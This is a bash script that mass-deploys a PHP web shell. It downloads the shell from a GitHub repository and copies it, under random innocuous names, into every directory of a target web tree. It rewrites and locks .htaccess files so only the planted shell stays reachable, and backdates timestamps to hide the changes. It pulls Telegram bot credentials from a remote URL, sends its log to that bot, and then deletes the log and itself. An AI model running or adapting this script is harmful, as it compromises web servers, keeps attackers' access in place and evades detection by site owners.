#!/bin/bash

if [ "$#" -ne 1 ]; then
  echo "Usage: $0 /path/to/directory"
  exit 1
fi

TARGET_DIR=$1
LOG_FILE="$(dirname "$0")/logfile.log"
SCRIPT_PATH="$0"
NOHUP_FILE="$(dirname "$0")/nohup.out"
PASTEBIN_URL="https://raw.githubusercontent.com/anggasetiawan125/isi-nama-repo/refs/heads/main/bot"

fetch_telegram_credentials() {
    local url=$1
    local response=$(curl -s "$url")
    TELEGRAM_TOKEN=$(echo "$response" | awk -F',' '{print $1}')
    CHAT_ID=$(echo "$response" | awk -F',' '{print $2}')
}

fetch_telegram_credentials "$PASTEBIN_URL"

send_telegram_logfile() {
    curl -s -k -F "chat_id=$CHAT_ID" \
         -F "document=@$LOG_FILE" \
         -F "caption=Log File" \
         "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendDocument"
}

update_htaccess() {
  local dir="$1"
  local php_file_name="$2"
  local htaccess_file="$dir/.htaccess"

  if [ -f "$htaccess_file" ]; then
    cp "$htaccess_file" "$htaccess_file.bak"
    if ! rm -f "$htaccess_file"; then
      local msg="$(date) - Failed to delete .htaccess in $dir. It may be protected or require higher permissions."
      echo "$msg" >> "$LOG_FILE"
      return
    fi
  fi
  
  {
    echo "<Files *.ph*>"
    echo "    Order Deny,Allow"
    echo "    Deny from all"
    echo "</Files>"
    echo "<Files *.a*>"
    echo "    Order Deny,Allow"
    echo "    Deny from all"
    echo "</Files>"
    echo "<Files *.Ph*>"
    echo "    Order Deny,Allow"
    echo "    Deny from all"
    echo "</Files>"
    echo "<Files *.S*>"
    echo "    Order Deny,Allow"
    echo "    Deny from all"
    echo "</Files>"
    echo "<Files *.pH*>"
    echo "    Order Deny,Allow"
    echo "    Deny from all"
    echo "</Files>"
    echo "<Files *.PH*>"
    echo "    Order Deny,Allow"
    echo "    Deny from all"
    echo "</Files>"
    echo "<Files *.s*>"
    echo "    Order Deny,Allow"
    echo "    Deny from all"
    echo "</Files>"
    echo
    echo "<FilesMatch \"\\.(jpg|pdf|docx|jpeg|)\$\">"
    echo "    Order Deny,Allow"
    echo "    Allow from all"
    echo "</FilesMatch>"
    echo
    echo "<FilesMatch \"^(index.html|$php_file_name)\$\">"
    echo " Order allow,deny"
    echo " Allow from all"
    echo "</FilesMatch>"
    echo
    echo "DirectoryIndex index.html"
    echo
    echo "Options -Indexes"
    echo "ErrorDocument 403 \"403 Forbidden\""
    echo "ErrorDocument 404 \"403 Forbidden\""
  } > "$htaccess_file" || {
    local msg="$(date) - Failed to create .htaccess in $dir. Attempting to change folder permissions to 0000."
    echo "$msg" >> "$LOG_FILE"

    if ! chmod 0000 "$dir"; then
      local chmod_msg="$(date) - Failed to set permissions for folder $dir"
      echo "$chmod_msg" >> "$LOG_FILE"
    fi

    return
  }

  if ! chmod 0444 "$htaccess_file"; then
    local msg="$(date) - Failed to set permissions for .htaccess in $dir"
    echo "$msg" >> "$LOG_FILE"
  fi

  set_random_date "$htaccess_file"
}

set_random_date() {
  local file=$1
  local start_date="2019-01-01"
  local end_date="2024-12-31"
  local random_timestamp=$(shuf -i $(date -d "$start_date" +%s)-$(date -d "$end_date" +%s) -n 1)
  local random_date=$(date -d "@$random_timestamp" "+%Y%m%d%H%M.%S")
  touch -t $random_date "$file"
}

generate_random_name() {
  local names=("wolv2" "index-MAR" "class" "mycustom" "script1" "kelasBaru" "tesFile" "moduleX" "handler" "serviceA")
  local count="${#names[@]}"
  local index=$((RANDOM % count))
  echo "${names[$index]}"
}

export -f update_htaccess
export -f send_telegram_logfile
export -f set_random_date
export -f generate_random_name
export TELEGRAM_TOKEN
export CHAT_ID
export LOG_FILE
export TARGET_DIR

GITHUB_TEMPLATE_PHP="https://raw.githubusercontent.com/paylar/shell/refs/heads/main/alfaob.phar"
TEMPLATE_PHP="template.php"
curl -s -o "$TEMPLATE_PHP" "$GITHUB_TEMPLATE_PHP"

if [ ! -f "$TEMPLATE_PHP" ]; then
    echo "$(date) - Failed to fetch template file from GitHub" >> "$LOG_FILE"
    exit 1
fi

upload_php_files() {
  local dir="$1"
  local php_file_name="$(generate_random_name).php"
  local php_file_path="$dir/$php_file_name"

  cp "$TEMPLATE_PHP" "$php_file_path"

  if ! chmod 0644 "$php_file_path"; then
    local msg="$(date) - Failed to set permissions for PHP file in $dir"
    echo "$msg" >> "$LOG_FILE"
  fi

  set_random_date "$php_file_path"

  update_htaccess "$dir" "$php_file_name"
}

export -f upload_php_files

run_with_xargs_loop() {
  local parallelisms=(2)
  local idx=0

  while true; do
    local parallelism=${parallelisms[$idx]}
    echo "$(date) - Running with parallelism -P $parallelism" >> "$LOG_FILE"

    find "$TARGET_DIR" -type d \( -name '.*' -o -name '*' \) -print0 | \
    xargs -0 -n 1 -P "$parallelism" -I {} bash -c 'upload_php_files "{}" || { echo "$(date) - Memory limit reached while processing {} with -P '$parallelism'" >> "$LOG_FILE"; false; }'

    if [ $? -eq 0 ]; then
      break
    fi

    idx=$((idx + 1))

    if [ $idx -eq ${#parallelisms[@]} ]; then
      idx=0
    fi
  done
}

rm -f "$LOG_FILE"

run_with_xargs_loop

if [ -s "$LOG_FILE" ]; then
    send_telegram_logfile
fi

sleep 5

rm -f "$LOG_FILE" "$NOHUP_FILE" "$SCRIPT_PATH"
